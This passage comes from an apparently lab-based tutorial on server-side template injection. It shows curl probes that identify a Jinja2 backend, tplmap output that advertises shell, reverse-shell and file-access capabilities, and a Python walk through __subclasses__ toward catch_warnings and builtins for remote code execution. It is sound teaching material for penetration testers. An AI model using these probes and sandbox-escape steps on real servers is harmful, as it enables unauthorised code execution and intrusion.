            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>49<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Windows"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Minimize the windows to the taskbar, make them full screen or close them.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Drag the title bar to move the windows or resize them from the bottom right corner.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"taskbar"</span>&gt;</span>        
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"icons"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"0"</span>&gt;</span>Run<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"5px"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://html5-templates.com/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"nofollow"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"templateLink"</span>&gt;</span>&amp;copy; HTML5-Templates.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!</p>
<p>As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Once again, let&#39;s use PortSwigger&#39;s diagram in the <code>SSTI Identification</code>. We already know that the <code>{{7*7}}</code> expression was evaluated successfully. The next expression the diagram suggests trying is <code>{{7*&#39;7&#39;}}</code>. Let us try it and see how the application responds.</p>
<p>SSTI Exploitation Example 3</p>
<pre><code class="lang-shell-session"><span class="xml">root@htb[/htb]$ curl -gs "http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:<span class="hljs-tag">&lt;<span class="hljs-name">PORT</span>&gt;</span>/execute?cmd=</span><span class="hljs-template-variable">{{7*'7'}}</span><span class="xml">"

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span>&gt;</span><span class="css">
    <span class="hljs-selector-id">#command</span> {
        <span class="hljs-attribute">resize</span>: horizontal;
        <span class="hljs-attribute">background-color </span>: transparent;
        <span class="hljs-attribute">border-color</span>: transparent;
        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">15px</span>;
        <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;

    }
    <span class="hljs-selector-id">#command</span><span class="hljs-selector-pseudo">:active</span> {
        <span class="hljs-attribute">width</span>: auto;   
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"x-ua-compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/jquery-ui.css"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-1.12.4.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/jquery-ui.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/js/script.js"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>    
    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/css"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/css/style.css"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"desktop"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Run"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/execute"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>C:\&gt;<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"command"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>7777777<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"execute"</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"window"</span> <span class="hljs-attr">data-title</span>=<span class="hljs-string">"Windows"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Windows<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Minimize the windows to the taskbar, make them full screen or close them.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Drag the title bar to move the windows or resize them from the bottom right corner.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"taskbar"</span>&gt;</span>        
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"icons"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"0"</span>&gt;</span>Run<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"openWindow"</span> <span class="hljs-attr">data-id</span>=<span class="hljs-string">"1"</span>&gt;</span>Welcome<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">font</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"5px"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://html5-templates.com/"</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"nofollow"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"templateLink"</span>&gt;</span>&amp;copy; HTML5-Templates.com<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">font</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- You can use this template freely if you leave a visible link to HTML5-Templates.com --&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
</code></pre>
<p>The application successfully evaluated this expression as well. According to PortSwigger&#39;s diagram, we are dealing with either a Jinja2 or a Twig template engine. That being said, the fact that {{7*&#39;7&#39;}} was evaluated with the application returning 7777777 means that Jinja2 is being utilized on the backend.</p>
<p>We could have automated the template engine identification process we just executed through <code>tplmap</code>, as follows.</p>
<p><strong>tplmap.py</strong></p>
<p>SSTI Exploitation Example 3</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ./tplmap.py -u <span class="hljs-symbol">'http</span>://&lt;TARGET IP&gt;:&lt;PORT&gt;/execute?cmd'

    Automatic Server-Side Template Injection Detection <span class="hljs-keyword">and</span> Exploitation Tool

[+] Testing <span class="hljs-keyword">if</span> GET parameter <span class="hljs-symbol">'cmd</span>' <span class="hljs-keyword">is</span> injectable
[+] Smarty plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-string">'*'</span>
[+] Smarty plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Mako plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag '${*}'
[+] Mako plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Python plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag <span class="hljs-symbol">'str</span>(*)'
[+] Python plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Tornado plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag '{{*}}'
[+] Tornado plugin <span class="hljs-keyword">is</span> testing blind injection
[+] Jinja2 plugin <span class="hljs-keyword">is</span> testing rendering <span class="hljs-keyword">with</span> tag '{{*}}'
[+] Jinja2 plugin has confirmed injection <span class="hljs-keyword">with</span> tag '{{*}}'
[+] Tplmap identified the following injection point:

  GET parameter: cmd
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind <span class="hljs-keyword">and</span> <span class="hljs-keyword">reverse</span> shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Rerun tplmap providing one <span class="hljs-keyword">of</span> the following options:

    <span class="hljs-comment">--os-shell                Run shell on the target</span>
    <span class="hljs-comment">--os-cmd                Execute shell commands</span>
    <span class="hljs-comment">--bind-shell PORT            Connect to a shell bind to a target port</span>
    <span class="hljs-comment">--reverse-shell HOST PORT    Send a shell back to the attacker's port</span>
    <span class="hljs-comment">--upload LOCAL REMOTE    Upload files to the server</span>
    <span class="hljs-comment">--download REMOTE LOCAL    Download remote files</span>
</code></pre>
<p>The next step is to gain remote code execution on the target server. Before moving to the payload development part, let&#39;s look at some Python for SSTI.</p>
<hr>
<h3 id="python-primer-for-ssti">Python Primer for SSTI</h3>
<p>Below is a small dictionary from <a href="https://www.fatalerrors.org/a/0dhx1Dk.html">fatalerrors.org</a> to refer to when going over the Jinja2 payload development part of this section:</p>
<table data-header-hidden><thead><tr><th width="87"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>No.</strong></td><td><strong>Methods</strong></td><td><strong>Description</strong></td></tr><tr><td>1.</td><td><code><strong>class</strong></code></td><td>Returns the object (class) to which the type belongs</td></tr><tr><td>2.</td><td><code><strong>mro</strong></code></td><td>Returns a tuple containing the base class inherited by the object. Methods are parsed in the order of tuples.</td></tr><tr><td>3.</td><td><code><strong>subclasses</strong></code></td><td>Each new class retains references to subclasses, and this method returns a list of references that are still available in the class</td></tr><tr><td>4.</td><td><code><strong>builtins</strong></code></td><td>Returns the builtin methods included in a function</td></tr><tr><td>5.</td><td><code><strong>globals</strong></code></td><td>A reference to a dictionary that contains global variables for a function</td></tr><tr><td>6.</td><td><code><strong>base</strong></code></td><td>Returns the base class inherited by the object &#x3C;-- (<strong> base</strong> and <strong> mro</strong> are used to find the base class)</td></tr><tr><td>7.</td><td><code><strong>init</strong></code></td><td>Class initialization method</td></tr></tbody></table>

<p>Start by running Python on Pwnbox&#39;s or a local VM&#39;s terminal, then follow along.</p>
<p><strong>Python 3 Interpreter</strong></p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python3

Python <span class="hljs-number">3.9</span>.<span class="hljs-number">2</span> (<span class="hljs-keyword">default</span>, Feb <span class="hljs-number">28</span> <span class="hljs-number">2021</span>, <span class="hljs-number">17</span>:<span class="hljs-number">03</span>:<span class="hljs-number">44</span>) 
[GCC <span class="hljs-number">10.2</span>.<span class="hljs-number">1</span> <span class="hljs-number">20210110</span>] <span class="hljs-literal">on</span> linux
Type <span class="hljs-string">"help"</span>, <span class="hljs-string">"copyright"</span>, <span class="hljs-string">"credits"</span> <span class="hljs-keyword">or</span> <span class="hljs-string">"license"</span> <span class="hljs-keyword">for</span> more information.
&gt;&gt;&gt;
</code></pre>
<p>Create a string object and use <code>type</code> and <code>__class__</code>, as follows. Then use the <code>dir()</code> command to show all methods and attributes from the object.</p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; import flask
<span class="hljs-meta">&gt;&gt;</span>&gt; s = <span class="hljs-string">'HTB'</span>
<span class="hljs-meta">&gt;&gt;</span>&gt; type(s)

&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>


<span class="hljs-meta">&gt;&gt;</span>&gt; s.__class_<span class="hljs-number">_</span>

&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">str</span>'&gt;</span>


<span class="hljs-meta">&gt;&gt;</span>&gt; dir(s)

[<span class="hljs-string">'__add__'</span>, <span class="hljs-string">'__class__'</span>, <span class="hljs-string">'__contains__'</span>, <span class="hljs-string">'__delattr__'</span>, <span class="hljs-string">'__dir__'</span>, <span class="hljs-string">'__doc__'</span>, <span class="hljs-string">'__eq__'</span>, <span class="hljs-string">'__format__'</span>, <span class="hljs-string">'__ge__'</span>, <span class="hljs-string">'__getattribute__'</span>, <span class="hljs-string">'__getitem__'</span>, <span class="hljs-string">'__getnewargs__'</span>, <span class="hljs-string">'__gt__'</span>, <span class="hljs-string">'__hash__'</span>, <span class="hljs-string">'__init__'</span>, <span class="hljs-string">'__init_subclass__'</span>, <span class="hljs-string">'__iter__'</span>, <span class="hljs-string">'__le__'</span>, <span class="hljs-string">'__len__'</span>, <span class="hljs-string">'__lt__'</span>, <span class="hljs-string">'__mod__'</span>, <span class="hljs-string">'__mul__'</span>, <span class="hljs-string">'__ne__'</span>, <span class="hljs-string">'__new__'</span>, <span class="hljs-string">'__reduce__'</span>, <span class="hljs-string">'__reduce_ex__'</span>, <span class="hljs-string">'__repr__'</span>, <span class="hljs-string">'__rmod__'</span>, <span class="hljs-string">'__rmul__'</span>, <span class="hljs-string">'__setattr__'</span>, <span class="hljs-string">'__sizeof__'</span>, <span class="hljs-string">'__str__'</span>, <span class="hljs-string">'__subclasshook__'</span>, <span class="hljs-string">'capitalize'</span>, <span class="hljs-string">'casefold'</span>, <span class="hljs-string">'center'</span>, <span class="hljs-string">'count'</span>, <span class="hljs-string">'encode'</span>, <span class="hljs-string">'endswith'</span>, <span class="hljs-string">'expandtabs'</span>, <span class="hljs-string">'find'</span>, <span class="hljs-string">'format'</span>, <span class="hljs-string">'format_map'</span>, <span class="hljs-string">'index'</span>, <span class="hljs-string">'isalnum'</span>, <span class="hljs-string">'isalpha'</span>, <span class="hljs-string">'isascii'</span>, <span class="hljs-string">'isdecimal'</span>, <span class="hljs-string">'isdigit'</span>, <span class="hljs-string">'isidentifier'</span>, <span class="hljs-string">'islower'</span>, <span class="hljs-string">'isnumeric'</span>, <span class="hljs-string">'isprintable'</span>, <span class="hljs-string">'isspace'</span>, <span class="hljs-string">'istitle'</span>, <span class="hljs-string">'isupper'</span>, <span class="hljs-string">'join'</span>, <span class="hljs-string">'ljust'</span>, <span class="hljs-string">'lower'</span>, <span class="hljs-string">'lstrip'</span>, <span class="hljs-string">'maketrans'</span>, <span class="hljs-string">'partition'</span>, <span class="hljs-string">'replace'</span>, <span class="hljs-string">'rfind'</span>, <span class="hljs-string">'rindex'</span>, <span class="hljs-string">'rjust'</span>, <span class="hljs-string">'rpartition'</span>, <span class="hljs-string">'rsplit'</span>, <span class="hljs-string">'rstrip'</span>, <span class="hljs-string">'split'</span>, <span class="hljs-string">'splitlines'</span>, <span class="hljs-string">'startswith'</span>, <span class="hljs-string">'strip'</span>, <span class="hljs-string">'swapcase'</span>, <span class="hljs-string">'title'</span>, <span class="hljs-string">'translate'</span>, <span class="hljs-string">'upper'</span>, <span class="hljs-string">'zfill'</span>]
</code></pre>
<p>The next step is to understand Python&#39;s hierarchy. Using <code>__mro__</code> or <code>mro()</code>, we can go back up the tree of inherited objects in the Python environment. Let&#39;s practice this as follows.</p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;</span>&gt; s.__class_<span class="hljs-number">_</span>.__class_<span class="hljs-number">_</span>

&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">type</span>'&gt;</span>


<span class="hljs-meta">&gt;&gt;</span>&gt; s.__class_<span class="hljs-number">_</span>.__base_<span class="hljs-number">_</span>

&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">object</span>'&gt;</span>


<span class="hljs-meta">&gt;&gt;</span>&gt; s.__class_<span class="hljs-number">_</span>.__base_<span class="hljs-number">_</span>.__subclasses_<span class="hljs-number">_</span>()

[&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">type</span>'&gt;, &lt;class '<span class="hljs-title">weakref</span>'&gt;, &lt;class '<span class="hljs-title">weakcallableproxy</span>'&gt;, &lt;class '<span class="hljs-title">weakproxy</span>'&gt;, &lt;class '<span class="hljs-title">int</span>'&gt;, &lt;class '<span class="hljs-title">bytearray</span>'&gt;, &lt;class '<span class="hljs-title">bytes</span>'&gt;, &lt;class '<span class="hljs-title">list</span>'&gt;, &lt;class '<span class="hljs-title">NoneType</span>'&gt;, &lt;class '<span class="hljs-title">NotImplementedType</span>'&gt;, &lt;class '<span class="hljs-title">traceback</span>'&gt;, &lt;class '<span class="hljs-title">super</span>'&gt;, &lt;class '<span class="hljs-title">range</span>'&gt;, &lt;class '<span class="hljs-title">dict</span>'&gt;, &lt;class '<span class="hljs-title">dict_keys</span>'&gt;, &lt;class '<span class="hljs-title">dict_values</span>'&gt;, &lt;class '<span class="hljs-title">dict_items</span>'&gt;, &lt;class '<span class="hljs-title">dict_reversekeyiterator</span>'&gt;, &lt;class '<span class="hljs-title">dict_reversevalueiterator</span>'&gt;, &lt;class '<span class="hljs-title">dict_reverseitemiterator</span>'&gt;, &lt;class '<span class="hljs-title">odict_iterator</span>'&gt;, &lt;class '<span class="hljs-title">set</span>'&gt;, &lt;class '<span class="hljs-title">str</span>'&gt;, &lt;class '<span class="hljs-title">slice</span>'&gt;, &lt;class '<span class="hljs-title">staticmethod</span>'&gt;, &lt;class '<span class="hljs-title">complex</span>'&gt;, &lt;class '<span class="hljs-title">float</span>'&gt;, &lt;class '<span class="hljs-title">frozenset</span>'&gt;, &lt;class '<span class="hljs-title">property</span>'&gt;, &lt;class '<span class="hljs-title">managedbuffer</span>'&gt;, &lt;class '<span class="hljs-title">memoryview</span>'&gt;, &lt;class '<span class="hljs-title">tuple</span>'&gt;, &lt;class '<span class="hljs-title">enumerate</span>'&gt;, &lt;class '<span class="hljs-title">reversed</span>'&gt;, &lt;class '<span class="hljs-title">stderrprinter</span>'&gt;, &lt;class '<span class="hljs-title">code</span>'&gt;, &lt;class '<span class="hljs-title">frame</span>'&gt;, &lt;class '<span class="hljs-title">builtin_function_or_method</span>'&gt;, &lt;class '<span class="hljs-title">method</span>'&gt;,</span>
 &lt;SNIP&gt;


<span class="hljs-meta">&gt;&gt;</span>&gt; s.__class_<span class="hljs-number">_</span>.mro()[<span class="hljs-number">1</span>].__subclasses_<span class="hljs-number">_</span>()

[&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> '<span class="hljs-title">type</span>'&gt;, &lt;class '<span class="hljs-title">weakref</span>'&gt;, &lt;class '<span class="hljs-title">weakcallableproxy</span>'&gt;, &lt;class '<span class="hljs-title">weakproxy</span>'&gt;, &lt;class '<span class="hljs-title">int</span>'&gt;, &lt;class '<span class="hljs-title">bytearray</span>'&gt;, &lt;class '<span class="hljs-title">bytes</span>'&gt;, &lt;class '<span class="hljs-title">list</span>'&gt;, &lt;class '<span class="hljs-title">NoneType</span>'&gt;, &lt;class '<span class="hljs-title">NotImplementedType</span>'&gt;, &lt;class '<span class="hljs-title">traceback</span>'&gt;, &lt;class '<span class="hljs-title">super</span>'&gt;, &lt;class '<span class="hljs-title">range</span>'&gt;, &lt;class '<span class="hljs-title">dict</span>'&gt;, &lt;class '<span class="hljs-title">dict_keys</span>'&gt;, &lt;class '<span class="hljs-title">dict_values</span>'&gt;, &lt;class '<span class="hljs-title">dict_items</span>'&gt;, &lt;class '<span class="hljs-title">dict_reversekeyiterator</span>'&gt;, &lt;class '<span class="hljs-title">dict_reversevalueiterator</span>'&gt;, &lt;class '<span class="hljs-title">dict_reverseitemiterator</span>'&gt;, &lt;class '<span class="hljs-title">odict_iterator</span>'&gt;, &lt;class '<span class="hljs-title">set</span>'&gt;, &lt;class '<span class="hljs-title">str</span>'&gt;, &lt;class '<span class="hljs-title">slice</span>'&gt;, &lt;class '<span class="hljs-title">staticmethod</span>'&gt;, &lt;class '<span class="hljs-title">complex</span>'&gt;, &lt;class '<span class="hljs-title">float</span>'&gt;, &lt;class '<span class="hljs-title">frozenset</span>'&gt;, &lt;class '<span class="hljs-title">property</span>'&gt;, &lt;class '<span class="hljs-title">managedbuffer</span>'&gt;, &lt;class '<span class="hljs-title">memoryview</span>'&gt;, &lt;class '<span class="hljs-title">tuple</span>'&gt;, &lt;class '<span class="hljs-title">enumerate</span>'&gt;, &lt;class '<span class="hljs-title">reversed</span>'&gt;, &lt;class '<span class="hljs-title">stderrprinter</span>'&gt;, &lt;class '<span class="hljs-title">code</span>'&gt;, &lt;class '<span class="hljs-title">frame</span>'&gt;, &lt;class '<span class="hljs-title">builtin_function_or_method</span>'&gt;, &lt;class '<span class="hljs-title">method</span>'&gt;,</span>
 &lt;SNIP&gt;
</code></pre>
<p>Now, let us look for useful classes that can facilitate remote code execution.</p>
<pre><code class="lang-python"><span class="hljs-meta">&gt;&gt;&gt; </span>x = s.__class__.mro()[<span class="hljs-number">1</span>].__subclasses__()
<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(x)):print(i, x[i].__name__)
...
<span class="hljs-number">0</span> type
<span class="hljs-number">1</span> weakref
<span class="hljs-number">2</span> weakcallableproxy
<span class="hljs-number">3</span> weakproxy
<span class="hljs-number">4</span> int
<span class="hljs-number">5</span> bytearray
<span class="hljs-number">6</span> bytes
<span class="hljs-number">7</span> list
<span class="hljs-number">8</span> NoneType
&lt;SNIP&gt;

<span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">searchfunc</span><span class="hljs-params">(name)</span>:</span>
<span class="hljs-meta">... </span>    x = s.__class__.mro()[<span class="hljs-number">1</span>].__subclasses__()
<span class="hljs-meta">... </span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(x)):
<span class="hljs-meta">... </span>            fn = x[i].__name__
<span class="hljs-meta">... </span>            <span class="hljs-keyword">if</span> fn.find(name) &gt; <span class="hljs-number">-1</span>:
<span class="hljs-meta">... </span>                    print(i, fn)
...
<span class="hljs-meta">&gt;&gt;&gt; </span>searchfunc(<span class="hljs-string">'warning'</span>)

<span class="hljs-number">215</span> catch_warnings
</code></pre>
<p>Why are we searching for <code>warning</code> you may ask. We chose this class because it imports Python&#39;s <a href="https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3">sys module</a> , and from <code>sys</code>, the <code>os</code> module can be reached. More precisely, os modules are all from <code>warnings.catch_</code>.</p>
<p>Please note that you will probably come across a different number. Back to our Python for SSTI specifics, we have seen that <code>catch_warnings</code> is present without importing any additional module to our Python console. Let&#39;s enumerate the builtins from this class as follows.</p>
<pre><code class="lang-python">&gt;&gt;&gt; y = x[<span class="hljs-number">215</span>]
&gt;&gt;&gt; y

&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'warnings.catch_warnings'</span>&gt;


&gt;&gt;&gt; y().<span class="hljs-number">_m</span>odule.<span class="hljs-number">__</span>builtins<span class="hljs-number">__</span>

